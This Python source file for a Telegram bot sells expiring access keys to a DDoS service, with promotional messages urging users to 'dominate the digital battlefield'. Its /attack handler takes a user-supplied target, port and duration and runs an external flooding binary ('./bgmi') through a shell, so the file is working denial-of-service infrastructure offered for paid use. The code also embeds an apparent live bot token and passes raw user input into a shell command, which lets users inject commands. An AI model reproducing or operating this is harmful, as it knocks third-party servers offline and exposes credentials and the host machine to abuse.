import telebot
import subprocess
import datetime
import os
import uuid

# Insert your Telegram bot token here
bot = telebot.TeleBot('7674842163:AAGHwopeT9v3OuTDqDUDTNgX-2gJk-9KGyA')

# Admin user IDs
admin_id = ["1078086201"]

# File to store allowed user IDs and their subscription expiry
USER_FILE = "users.txt"
SUBSCRIPTION_FILE = "subscriptions.txt"
LOG_FILE = "log.txt"
KEY_FILE = "keys.txt"

# Subscription periods
subscription_periods = {
    '1min': 60,
    '1hour': 3600,
    '6hours': 21600,
    '12hours': 43200,
    '1day': 86400,
    '3days': 259200,
    '7days': 604800,
    '1month': 2592000,
    '2months': 5184000
}

# Key system: Read, write, generate, validate, and remove keys
def read_keys():
    keys = {}
    try:
        with open(KEY_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    key = parts[0]
                    expiry_str = " ".join(parts[1:])
                    try:
                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
                        keys[key] = expiry
                    except ValueError:
                        print(f"Error parsing date for key {key}: {expiry_str}")
    except FileNotFoundError:
        pass
    return keys

def write_keys(keys):
    with open(KEY_FILE, "w") as file:
        for key, expiry in keys.items():
            file.write(f"{key} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")

def generate_key(duration):
    new_key = str(uuid.uuid4())
    expiry = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    keys[new_key] = expiry
    write_keys(keys)
    return new_key

def validate_key(key):
    if key in keys:
        if datetime.datetime.now() < keys[key]:
            return True
        else:
            del keys[key]
            write_keys(keys)
    return False

def remove_key(key):
    if key in keys:
        del keys[key]
        write_keys(keys)
        return True
    return False

# Initialize key storage
keys = read_keys()

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Initialize allowed user IDs
allowed_user_ids = read_users()

# Welcome and key validation
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = (
        f'🎉👋 𝐇𝐄𝐘 {user_name}! 👋🎉\n\n'
        f'🌐 **Welcome to the Ultimate DDoS Bot World!** 🌐\n\n'
        f'⚡ **Unleash your power** and dominate the digital battlefield! 💣💥\n'
        f'🎯 **What you can do**:\n'
        f'🔥 **Attack Targets**: Launch powerful attacks on authorized targets using `/attack <target> <port> <time>`.\n'
        f'🔍 **View Your Info**: Use the buttons below to access your details or unleash your power.\n\n'
        f'💡 **New here?** Explore the usage guide and watch our video tutorial to get started! 📽️\n\n'
        f'⚠️ **Note**: With great power comes great responsibility! Use it wisely or let chaos reign! 😈💥\n\n'
        f'🚀 **Get started** using the options below:'
        f'To Get Access Use Cmd /enterkey And Paste your Key 🔐 '
    )
    
    # Inline keyboard
    keyboard = telebot.types.InlineKeyboardMarkup()
    
    # First button row
    keyboard.row(
        telebot.types.InlineKeyboardButton('💸 BUY HACK', url='https://t.me/NEWVIPDDOS'),
        telebot.types.InlineKeyboardButton('📷 SEND SCREENSHOT', url='https://t.me/NEWVIPDDOS')
    )
    
    # Second button row
    keyboard.row(
        telebot.types.InlineKeyboardButton('🎓 How To Use', url='https://t.me/crossbeats7262'),
        telebot.types.InlineKeyboardButton('🆔 Telegram ID', url='https://t.me/MissRose_bot')
    )
    
    # Third button row (for Attack and My Info)
    keyboard.row(
        telebot.types.InlineKeyboardButton('⚔️ Attack', callback_data='attack'),
        telebot.types.InlineKeyboardButton('ℹ️ My Info', callback_data='my_info')
    )
    
    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data in ['attack', 'my_info'])
def handle_callback_query(call):
    if call.data == 'attack':
        bot.answer_callback_query(call.id, "Attack feature triggered!")
        # Add logic for attack here
    elif call.data == 'my_info':
        bot.answer_callback_query(call.id, f"Your Telegram ID is: {call.from_user.id}")

# Generate and remove key commands for admin
@bot.message_handler(commands=['genkey'])
def generate_new_key(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            period = command[1]
            if period in subscription_periods:
                duration = subscription_periods[period]
                new_key = generate_key(duration)
                response = f"Generated Key: `{new_key}`\nExpires in: {period}"
            else:
                response = "Invalid period."
        else:
            response = "Please specify a subscription period."
    else:
        response = "You are not authorized to generate keys."
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['removekey'])
def remove_existing_key(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            key_to_remove = command[1]
            if remove_key(key_to_remove):
                response = f"Key `{key_to_remove}` removed successfully."
            else:
                response = "Key not found."
        else:
            response = "Please specify a key to remove."
    else:
        response = "You are not authorized to remove keys."
    bot.reply_to(message, response, parse_mode='Markdown')

# User enters key to gain access
@bot.message_handler(commands=['enterkey'])
def enter_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) > 1:
        user_key = command[1]
        if validate_key(user_key):
            if user_id not in allowed_user_ids:
                allowed_user_ids.append(user_id)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_id}\n")
            response = "Access granted! 🎉"
        else:
            response = "Invalid or expired key. 🚫"
    else:
        response = "Please provide a key."
    bot.reply_to(message, response, parse_mode='Markdown')

# Attack command
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            
            # Check time limit
            if time > 240:
                response = "Time is too high, limit to 240 seconds ⏳."
            else:
                # Prompt for key validation
                bot.reply_to(message, "Please enter your key for approval to proceed with the attack:")
                bot.register_next_step_handler(message, lambda msg: validate_and_execute_attack(msg, target, port, time))
        else:
            response = "Use the format: /attack <target> <port> <time>"
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

def validate_and_execute_attack(message, target, port, time):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) > 0:
        user_key = command[0]  # Assume the key is the first word entered
        if validate_key(user_key):
            log_command(user_id, target, port, time)
            
            # Inline keyboard for joining a channel
            keyboard = telebot.types.InlineKeyboardMarkup()
            join_button = telebot.types.InlineKeyboardButton('🚩 Join Channel 🚩', url='https://t.me/NEWVIPDDOS')
            keyboard.add(join_button)
            
            response = f"🚀 Attack started on {target}:{port} for {time} seconds. 🚀"
            bot.reply_to(message, response, reply_markup=keyboard)
            
            # Simulate attack
            full_command = f"./bgmi {target} {port} {time} 100"
            subprocess.run(full_command, shell=True)
        else:
            response = "Invalid or expired key. 🚫"
            bot.reply_to(message, response)
    else:
        bot.reply_to(message, "Please provide a key.")

# Polling the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)